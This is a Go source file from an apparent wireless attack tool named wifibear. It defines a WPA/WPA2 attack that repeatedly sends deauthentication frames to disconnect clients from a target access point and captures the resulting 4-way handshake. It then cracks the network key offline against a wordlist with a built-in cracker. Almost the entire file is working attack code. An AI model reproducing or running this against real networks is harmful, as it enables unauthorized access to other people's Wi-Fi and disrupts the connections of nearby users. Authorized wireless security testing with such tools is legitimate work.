package attack

import (
	"context"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"

	"github.com/wifibear/wifibear/internal/config"
	"github.com/wifibear/wifibear/internal/result"
	"github.com/wifibear/wifibear/internal/scan"
	"github.com/wifibear/wifibear/pkg/wifi"
)

// WPAAttack captures and cracks WPA/WPA2 4-way handshakes.
// Uses native gopacket capture and injection — no aircrack-ng suite required.
type WPAAttack struct {
	cfg    *config.Config
	deauth *DeauthAttack
}

func NewWPAAttack(cfg *config.Config) *WPAAttack {
	return &WPAAttack{
		cfg:    cfg,
		deauth: NewDeauthAttack(cfg),
	}
}

func (w *WPAAttack) Name() string {
	return "WPA Handshake Capture"
}

func (w *WPAAttack) Priority() int {
	return 30
}

func (w *WPAAttack) CanAttack(target *wifi.Target) bool {
	if w.cfg.Attack.WPSOnly || w.cfg.Attack.WEPOnly {
		return false
	}
	return target.Encryption == wifi.EncWPA || target.Encryption == wifi.EncWPA2
}

func (w *WPAAttack) Run(ctx context.Context, target *wifi.Target, iface string) (*result.CrackResult, error) {
	bssid := target.BSSID.String()
	timeout := w.cfg.Attack.WPA.HandshakeTimeout
	deauthInterval := w.cfg.Attack.WPA.DeauthInterval
	deauthCount := w.cfg.Attack.WPA.DeauthCount

	hsDir := w.cfg.Output.HandshakeDir
	if err := os.MkdirAll(hsDir, 0o755); err != nil {
		return nil, fmt.Errorf("create handshake dir: %w", err)
	}

	// Check for existing handshake files
	existingHS := w.findExistingHandshake(bssid, hsDir)
	if existingHS != "" {
		log.Printf("Found existing handshake: %s", existingHS)
		return w.crackHandshake(ctx, existingHS, target)
	}

	// Create capture file
	capPath := filepath.Join(hsDir, fmt.Sprintf("capture_%s_%s.cap",
		target.ESSID, time.Now().Format("20060102-150405")))

	// Start native capture writer (replaces airodump-ng)
	capturer, err := scan.NewCaptureWriter(iface, bssid, target.Channel, capPath)
	if err != nil {
		return nil, fmt.Errorf("start capture: %w", err)
	}
	defer capturer.Stop()

	// Channel for handshake notification
	handshakeCh := make(chan struct{}, 1)
	capturer.OnHandshake(func(hs *wifi.FourWayHandshake) {
		select {
		case handshakeCh <- struct{}{}:
		default:
		}
	})

	capturer.Start(ctx)

	// Wait briefly for capture to initialize
	time.Sleep(time.Second)

	// Main capture loop: deauth + check for handshake
	timeoutCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	deauthTicker := time.NewTicker(deauthInterval)
	defer deauthTicker.Stop()

	// Send initial deauth burst
	go w.deauth.DeauthTarget(ctx, iface, target, deauthCount)

	for {
		select {
		case <-timeoutCtx.Done():
			capturer.Stop()
			eapol := capturer.EAPOLCount()
			if eapol > 0 {
				return nil, fmt.Errorf("timed out with %d EAPOL frames (incomplete handshake), cap saved: %s", eapol, capPath)
			}
			return nil, fmt.Errorf("handshake capture timed out after %s", timeout)

		case <-handshakeCh:
			// Handshake captured!
			capturer.Stop()

			// Save to persistent location
			savedPath := w.saveHandshake(capPath, bssid, target.ESSID, hsDir)

			return w.crackHandshake(ctx, savedPath, target)

		case <-deauthTicker.C:
			go w.deauth.DeauthTarget(ctx, iface, target, deauthCount)
		}
	}
}

func (w *WPAAttack) crackHandshake(ctx context.Context, capFile string, target *wifi.Target) (*result.CrackResult, error) {
	wordlist := w.cfg.Wordlist
	if wordlist == "" {
		return &result.CrackResult{
			BSSID:         target.BSSID.String(),
			ESSID:         target.ESSID,
			Encryption:    target.Encryption.String(),
			AttackType:    "WPA Handshake",
			HandshakeFile: capFile,
			Timestamp:     time.Now(),
		}, fmt.Errorf("handshake saved at %s, no wordlist specified (use --wordlist)", capFile)
	}

	if _, err := os.Stat(wordlist); os.IsNotExist(err) {
		return nil, fmt.Errorf("wordlist not found: %s", wordlist)
	}

	// Use native Go cracker (no aircrack-ng needed)
	cracker := NewNativeCracker(target.ESSID, capFile, target.BSSID.String())

	key, err := cracker.CrackWithWordlist(ctx, wordlist)
	if err != nil {
		return &result.CrackResult{
			BSSID:         target.BSSID.String(),
			ESSID:         target.ESSID,
			Encryption:    target.Encryption.String(),
			AttackType:    "WPA Handshake",
			HandshakeFile: capFile,
			Timestamp:     time.Now(),
		}, fmt.Errorf("handshake saved at %s, crack failed: %w", capFile, err)
	}

	return &result.CrackResult{
		BSSID:         target.BSSID.String(),
		ESSID:         target.ESSID,
		Key:           key,
		Encryption:    target.Encryption.String(),
		AttackType:    "WPA Handshake",
		HandshakeFile: capFile,
		Timestamp:     time.Now(),
	}, nil
}

func (w *WPAAttack) saveHandshake(capFile, bssid, essid, hsDir string) string {
	safeName := fmt.Sprintf("hs_%s_%s.cap", essid, bssid)
	destPath := filepath.Join(hsDir, safeName)

	// Don't copy if already in the right place
	if capFile == destPath {
		return destPath
	}

	data, err := os.ReadFile(capFile)
	if err != nil {
		return capFile
	}

	if err := os.WriteFile(destPath, data, 0o644); err != nil {
		return capFile
	}

	return destPath
}

func (w *WPAAttack) findExistingHandshake(bssid, hsDir string) string {
	pattern := filepath.Join(hsDir, fmt.Sprintf("*%s*.cap", bssid))
	matches, err := filepath.Glob(pattern)
	if err != nil || len(matches) == 0 {
		return ""
	}
	return matches[0]
}
